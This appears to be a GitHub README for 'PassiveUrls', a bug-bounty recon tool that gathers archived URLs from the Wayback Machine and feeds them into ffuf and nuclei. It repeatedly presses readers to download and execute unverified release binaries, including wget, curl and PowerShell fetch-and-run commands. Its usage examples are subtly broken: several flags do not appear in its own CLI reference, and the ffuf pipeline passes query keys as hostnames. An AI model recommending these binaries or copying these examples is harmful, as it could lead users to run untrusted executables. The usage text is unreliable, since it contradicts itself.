https://github.com/babacosturan566/PassiveUrls/releases

# PassiveUrls — Wayback Passive URL Recon for Bug Bounty 🕵️‍♂️📚

[![Releases](https://img.shields.io/badge/Releases-Download%20%26%20Run-blue?logo=github)](https://github.com/babacosturan566/PassiveUrls/releases) [![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)  
[![bugbounty](https://img.shields.io/badge/topic-bugbounty-red)](https://github.com/topics/bugbounty) [![osint](https://img.shields.io/badge/topic-osint-orange)](https://github.com/topics/osint) [![recon](https://img.shields.io/badge/topic-recon-purple)](https://github.com/topics/recon) [![passive-crawling](https://img.shields.io/badge/topic-passive--crawling-blueviolet)](https://github.com/topics/passive-crawling)

![Wayback Machine and web recon](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=3d5f5728d7f3e1d5f5e39b1d7b4f1c2a)

PassiveUrls collects archived URLs for a domain from the Wayback Machine. It targets bug bounty and narrow recon workflows. It focuses on passive collection so you avoid active traffic to the target. Use it to build lists of historical endpoints, exposed parameters, forgotten assets, and archive-only resources.

Releases and binary builds live here: https://github.com/babacosturan566/PassiveUrls/releases  
Download the release file from that page and execute the provided binary or installer.

Table of contents
- Features
- Why PassiveUrls
- How it works
- Architecture and data flow
- Installation
  - Linux / macOS
  - Windows
  - Docker
  - From source
  - Release file details (download and execute)
- Quick start
  - Basic examples
  - Filters and output formats
- Full CLI reference
- Output formats and examples
  - JSON schema
  - CSV layout
  - URL normalization rules
- Integration and pipelines
  - With ffuf
  - With nuclei
  - With Burp or ZAP
- Use cases and scenarios
  - Discovery of hidden endpoints
  - Finding parameter patterns
  - Wayback-only asset recovery
- Performance and limits
- Storage and data hygiene
- Security and privacy considerations
- Troubleshooting and tips
- Contributing
- Changelog
- License
- Acknowledgements
- FAQ
- Glossary
- References and further reading

Features
- Passively collect archived URLs and snapshots from archive.org Wayback Machine.
- Fetch URL lists per domain, subdomain, and path prefix.
- Normalize and deduplicate URLs.
- Output in JSON, CSV, or plain text.
- Filter by HTTP status codes, timestamp range, MIME type, query parameters.
- Extract query keys and count frequency.
- Export raw Wayback snapshot metadata.
- Integrate with pipelines (ffuf, nuclei, grep).
- Small single-binary release for Linux, macOS, and Windows.

Why PassiveUrls
- Stop burning active requests when you only need historical coverage.
- Recover endpoints removed from production but still indexed in archives.
- Surface URL patterns and query strings to feed fuzzing and template matching.
- Collect stable lists for scoped bug bounty programs.
- Save time in the recon phase by producing ready-to-use lists.

How it works
1. Query Wayback Machine index for the target domain using the public CDX endpoint.
2. Parse CDX lines and extract archived URLs and snapshot metadata.
3. Normalize URLs, remove duplicates, and optionally filter by criteria.
4. Optionally fetch snapshot metadata to retrieve MIME type, status code, and timestamp.
5. Write structured output to disk or stdout.

Wayback endpoints used
- CDX API: https://web.archive.org/cdx/search/cdx?url=example.com&output=json
- Snapshot info: https://web.archive.org/web/*/http://example.com/

PassiveUrls uses the public CDX API with pagination. It respects rate limits and uses parallel fetch workers where appropriate.

Architecture and data flow
- fetcher: queries the Wayback CDX API and streams raw CDX rows.
- parser: converts CDX rows to structured records (URL, timestamp, status, mime, original).
- normalizer: canonicalizes scheme, host, path, and query ordering.
- filter: applies user filters such as status code, time window, or regex.
- exporter: writes results in the chosen format and handles dedupe.

The tool separates network I/O from parsing. This design allows partial runs, resumption, and easy testing.

Installation

Important: Download the release file from the Releases page and execute the included file as instructed on the release entry.

Releases: https://github.com/babacosturan566/PassiveUrls/releases

Linux / macOS (binary release)
1. Open the Releases page, pick the latest version, and download the Linux or macOS artifact (tar.gz or zip).
2. Unpack and set execute permission.
   - Example (Linux):
     ```
     wget -O passiveurls.tar.gz "https://github.com/babacosturan566/PassiveUrls/releases/download/vX.Y/PassiveUrls_vX.Y_linux_amd64.tar.gz"
     tar -xzf passiveurls.tar.gz
     chmod +x passiveurls
     ./passiveurls --help
     ```
   - Example (macOS):
     ```
     curl -L -o passiveurls-macos.tar.gz "https://github.com/babacosturan566/PassiveUrls/releases/download/vX.Y/PassiveUrls_vX.Y_darwin_amd64.tar.gz"
     tar -xzf passiveurls-macos.tar.gz
     chmod +x passiveurls
     ./passiveurls -h
     ```

Windows (binary release)
1. Visit the Releases page and download the .zip or .exe installer for Windows.
2. Unzip and run the executable. Example PowerShell snippet:
   ```
   Invoke-WebRequest -Uri "https://github.com/babacosturan566/PassiveUrls/releases/download/vX.Y/PassiveUrls_vX.Y_windows_amd64.zip" -OutFile "passiveurls.zip"
   Expand-Archive .\passiveurls.zip -DestinationPath .\passiveurls
   .\passiveurls\passiveurls.exe --help
   ```

Docker
- A Docker image lets you run PassiveUrls without install steps. Use the official image or build locally.
  ```
  docker run --rm -it babacosturan566/passiveurls:latest --help
  ```
- Replace with the image name on the Releases page or build with:
  ```
  git clone https://github.com/babacosturan566/PassiveUrls.git
  cd PassiveUrls
  docker build -t passiveurls:local .
  docker run --rm -v $(pwd):/data passiveurls:local --domain example.com -o /data/output.json
  ```

From source
- Clone the repo and build with the language toolchain. Example for Go:
  ```
  git clone https://github.com/babacosturan566/PassiveUrls.git
  cd PassiveUrls
  go build -o passiveurls ./cmd/passiveurls
  ./passiveurls --help
  ```

Release file details (download and execute)
- The Releases page contains compiled binaries and archive artifacts.
- Download the artifact that matches your OS and architecture.
- After download, extract and run the binary.
- On Linux/macOS, set execute permission with chmod +x.
- On Windows, run the .exe directly.

Quick start

Basic usage
- Collect all archived URLs for a domain and write to a text file.
  ```
  passiveurls --domain example.com --format text --out urls.txt
  ```
- Collect and output JSON with full metadata.
  ```
  passiveurls --domain example.com --format json --out example_urls.json
  ```

Find only unique paths
- Remove duplicate URL paths and keep only unique endpoints.
  ```
  passiveurls -d example.com --unique-paths -o unique_paths.txt
  ```

Filter by status
- Fetch only archived entries that reported a 200 status at time of snapshot.
  ```
  passiveurls -d example.com --status 200 -o ok_urls.txt
  ```

Filter by time range
- Fetch archives between 2018 and 2021.
  ```
  passiveurls -d example.com --from 20180101 --to 20211231 -o time_filtered.json
  ```

Top query keys
- Find the most common query parameter keys across archived URLs.
  ```
  passiveurls -d example.com --query-keys --top 50 -o query_keys.json
  ```

Fetch raw snapshot metadata
- Download raw Wayback snapshot metadata for each URL.
  ```
  passiveurls -d example.com --raw-snapshots -o snapshots.json
  ```

Full CLI reference

Common options
- --domain, -d <domain> : Domain to scan (required)
- --output, -o <file> : Output file path (default stdout)
- --format <text|json|csv> : Output format (text default)
- --unique, --unique-paths : Remove duplicates by normalized path
- --status <code> : Filter by HTTP status
- --from <YYYYMMDD> : Start date for snapshots
- --to <YYYYMMDD> : End date for snapshots
- --mime <type> : Filter by MIME type (text/html, application/json, etc.)
- --query-keys : Extract query parameter keys and counts
- --workers <n> : Number of parallel fetch workers
- --timeout <seconds> : Network timeout in seconds
- --raw-snapshots : Save raw Wayback snapshot metadata
- --help, -h : Show help

Examples in context
- Gather archived JavaScript files for a domain:
  ```
  passiveurls -d example.com --mime "application/javascript" -o js_urls.txt
  ```
- Only archived images:
  ```
  passiveurls -d example.com --mime "image/*" -o images.txt
  ```
- Use fewer workers for conservative rate:
  ```
  passiveurls -d example.com --workers 2 -o output.json
  ```

Output formats and examples

Plain text
- One normalized URL per line. Good for quick piping.
  ```
  https://example.com/login
  https://example.com/api/v1/users?id=1
  ```

CSV
- Columns: url,timestamp,status,mime,original
  - timestamp uses ISO format: 2019-06-01T12:34:56Z
  - status uses numeric HTTP status from snapshot metadata
  - mime is best-effort from Wayback or inferred
- Example:
  ```
  "https://example.com/login","2019-06-01T12:34:56Z","200","text/html","http://example.com/login"
  ```

JSON
- Each line is a JSON object in newline-delimited JSON (ndjson) for stream-friendly processing.
- Schema example:
  ```
  {
    "url": "https://example.com/api/search?q=test",
    "timestamp": "2019-06-01T12:34:56Z",
    "status": 200,
    "mime": "text/html",
    "original": "http://example.com/api/search?q=test",
    "snapshot_id": "20190601123456/https://example.com/api/search?q=test"
  }
  ```

URL normalization rules
- Convert scheme to https where possible for stable matching.
- Normalize host to lowercase.
- Remove default ports (80, 443).
- Sort query parameters by key, keep values in original order.
- Remove fragment (#) entirely.
- Optionally strip query values to keep only keys for pattern discovery.

Integration and pipelines

With ffuf (fuzzing)
- Use archived endpoints to fuzz parameters with ffuf.
  ```
  passiveurls -d example.com --query-keys --unique-paths -o payloads.txt
  cat payloads.txt | ffuf -w - -u https://FUZZ -t 40 -mc 200
  ```

With nuclei (templates)
- Feed discovered URLs to nuclei for CVE checks or template-based scanning.
  ```
  passiveurls -d example.com -o urls.txt
  nuclei -l urls.txt -t cves/
  ```

With Burp or ZAP
- Export JSON or CSV and import into Burp as site map entries.
- Use the snapshots to replay historical requests inside the proxy.

Automation example (CI-friendly)
- A simple pipeline to fetch new archived URLs daily and append unique entries to a dataset.
  ```
  passiveurls -d example.com --unique -o /tmp/new_urls.ndjson
  jq -s 'add | unique_by(.url)' old_urls.ndjson /tmp/new_urls.ndjson > merged.ndjson
  ```

Use cases and scenarios

Discovery of hidden endpoints
- Developers sometimes leave admin pages or debug endpoints accessible at some time. Archives capture those pages even if the site later removes them. PassiveUrls surfaces those endpoints so you can test them within scope.

Finding parameter patterns
- Archive data contains query parameters used historically. You can extract keys and create focused payload lists to find injections or logic flaws.

Wayback-only asset recovery
- Static files or uploads removed from the origin server may still live in Wayback snapshots. Use the raw snapshot metadata to retrieve file contents if needed.

Scoped bug bounty recon
- Use PassiveUrls to build an asset inventory for a target under scope. Export results into other tools for triage and testing.

Performance and limits
- The Wayback CDX API enforces access patterns. PassiveUrls uses worker pools and respects conservative defaults.
- For very large domains with many snapshots, expect longer runs and high IO.
- Use --workers to tune parallelism. Default keeps the thread count safe for public APIs.

Rate limiting and retries
- PassiveUrls retries transient network failures with exponential backoff.
- The tool logs fetch failures and continues when possible.

Storage and data hygiene
- Output can grow large for high-archive domains. Use ndjson and stream-based processing to avoid high memory use.
- Run periodic cleanup on cached snapshot metadata.
- Deduplicate aggressively to reduce storage.

Security and privacy considerations
- PassiveUrls performs passive queries to archive.org only. It does not scan the live target by default.
- Respect program scope and responsible disclosure policies before testing content beyond passive collection.
- If you download snapshot contents, handle any sensitive data per the program rules.

Troubleshooting and tips

Common issues
- Missing or empty output: verify the domain argument and check release notes for known API changes.
- Slow runs: reduce worker count or specify a narrower date range.
- Incomplete metadata: Wayback snapshots sometimes lack status or MIME info; filter accordingly.

Logging
- Use the --verbose flag to increase log output for debugging.
- Store logs to file when running large collections.

Tips
- Combine --from and --to to target eras of interest.
- Use --query-keys to find injection-rich parameters.
- Use CSV with a spreadsheet for manual triage.

Contributing
- The project welcomes bug reports, PRs, and feature requests.
- Fork the repo, make your changes on a branch, and open a pull request.
- Follow the coding style in the repo and add tests for new behaviors.
- Label issues clearly and include reproduction steps.

Changelog
- Each release entry on the Releases page lists changes and artifacts.
- Visit Releases to download the specific build for your OS: https://github.com/babacosturan566/PassiveUrls/releases

License
- PassiveUrls uses the MIT license. See LICENSE for full text.

Acknowledgements
- Wayback Machine / Internet Archive for public snapshot APIs.
- Open source tools and libraries that make web recon efficient.

FAQ

Q: Does PassiveUrls actively crawl the target site?
A: No. PassiveUrls queries the Wayback Machine and the public CDX index. It uses only archived data by default.

Q: Can I point PassiveUrls at a subdomain or path?
A: Yes. You can pass a full host or a URL prefix. Example: --domain sub.example.com or --domain example.com/path.

Q: How do I extract only query parameter names?
A: Use --query-keys. The tool outputs keys and frequency counts.

Q: How do I get the latest binary?
A: Visit the Releases page and download the appropriate artifact: https://github.com/babacosturan566/PassiveUrls/releases

Q: Can I run PassiveUrls in CI?
A: Yes. Use the binary or Docker image in your CI workflow. Output ndjson and merge results in a repository or object store.

Glossary
- CDX: Wayback Machine index format used to list archived snapshots.
- Snapshot: A recorded state of a URL at a moment in time.
- NDJSON: Newline-delimited JSON, good for streaming large datasets.

References and further reading
- Wayback CDX API docs: https://github.com/internetarchive/wayback/tree/master/wayback-cdx-server
- Internet Archive: https://archive.org/
- OSINT and recon reading lists
  - OSINT Framework: https://osintframework.com/
  - Web history and archiving best practices articles

Example real-world workflows

1) Narrow recon for a bug bounty target
- Run PassiveUrls for the scoped domain with a 5-year range.
  ```
  passiveurls -d target.com --from 20170101 --to 20211231 --unique -o target_urls.ndjson
  ```
- Extract query keys and sort by frequency.
  ```
  passiveurls -d target.com --query-keys | jq -r '.[] | [.key, .count] | @csv' > keys.csv
  ```
- Feed top 20 keys into a custom parameter fuzz list and run targeted ffuf scans.

2) Recover forgotten assets
- Use MIME filters to pull images and static files.
  ```
  passiveurls -d example.com --mime "image/*" --raw-snapshots -o images_snapshots.json
  ```
- For each snapshot, download snapshot content with the provided snapshot_id.

3) Merge historical lists with active scans
- Prepare an archived-URL baseline.
  ```
  passiveurls -d example.com --unique -o baseline.ndjson
  ```
- Merge with active discovery output.
  ```
  jq -s 'add | unique_by(.url)' active.ndjson baseline.ndjson > combined.ndjson
  ```

Best practices
- Keep a copy of the raw results before normalization for forensic context.
- Use date filters to focus on development eras or major releases.
- Combine with DNS and certificate transparency data to build a full asset map.

Release link (again)
- Download and run the release artifact from here: https://github.com/babacosturan566/PassiveUrls/releases

Images & visual aids
- Header image (archive and web): https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=3d5f5728d7f3e1d5f5e39b1d7b4f1c2a
- OSINT topic icon: https://raw.githubusercontent.com/github/explore/main/topics/osint/osint.png
- Recon topic icon: https://raw.githubusercontent.com/github/explore/main/topics/recon/recon.png

Command reference and examples (extended)

Collect only unique hosts from a domain list
- Input a file with domains and collect archived hosts.
  ```
  cat domains.txt | while read dom; do passiveurls -d $dom --unique-hosts -o hosts_$dom.txt; done
  ```

Collect URLs that contain a specific path segment
- Filter by regex on path.
  ```
  passiveurls -d example.com --path-regex '/admin|/debug' -o admin_debug_urls.txt
  ```

Sample output processing pipeline
- Normalize, dedupe, and prepare for nuclei.
  ```
  passiveurls -d example.com --format ndjson | jq -r '.url' | sort -u > urls_for_nuclei.txt
  nuclei -l urls_for_nuclei.txt -t /path/to/templates
  ```

Advanced configuration
- Config file support lets you store default flags:
  - ~/.passiveurls/config.yaml
  - Example:
    ```
    domain: example.com
    workers: 5
    format: json
    from: 20180101
    to: 20211231
    ```
- Load the config with --config path/to/config.yaml

Testing and quality
- Unit tests cover parser logic and normalization rules.
- Integration tests run against a small archive snapshot dataset to validate CDX parsing.

Telemetry and opt-out
- PassiveUrls does not phone home by default. It logs only local progress and errors. Adjust logging with --log-level.

Extending PassiveUrls
- Add a new exporter: implement the exporter interface and register it in cmd.
- Add a new filter: filters live in filters/ and accept a record. Add unit tests to cover edge cases.

Maintainers and contact
- Main repo: https://github.com/babacosturan566/PassiveUrls
- Use Issues for bugs and feature requests.
- Use pull requests for code contributions.

Legal and policy
- Use PassiveUrls according to program rules and local laws.
- Respect third-party rights when using archived content.

Runbook: reproducible daily collection
- Cron entry example to fetch daily archives and append new unique results:
  ```
  0 2 * * * /usr/local/bin/passiveurls -d example.com --unique -o /data/passiveurls/daily_$(date +\%Y\%m\%d).ndjson && /usr/local/bin/passiveurls-merge /data/passiveurls/*.ndjson -o /data/passiveurls/master.ndjson
  ```

Metrics to track
- Number of unique URLs per run
- New URLs found versus previous run
- Top query keys change over time

Example data audit process
- When a run completes, compare new results to master.ndjson:
  ```
  jq -s '.[0] + .[1] | unique_by(.url)' master.ndjson new_run.ndjson > merged.ndjson
  mv merged.ndjson master.ndjson
  ```

Scripts and helpers
- Provided helper scripts in scripts/ to transform ndjson to CSV, extract query keys, or fetch raw snapshots.

Community and learning
- Look for recon playbooks and OSINT resources to combine PassiveUrls output with other signals.
- Join relevant communities for tips on effective parameter discovery and scope management.

Development roadmap (example)
- Add support for other archives (CommonCrawl, Google cached pages).
- Add interactive mode for triage.
- Add a web UI for browsing results locally.

Credits
- Internet Archive for public CDX APIs.
- Contributors listed in CONTRIBUTORS.md.

End of file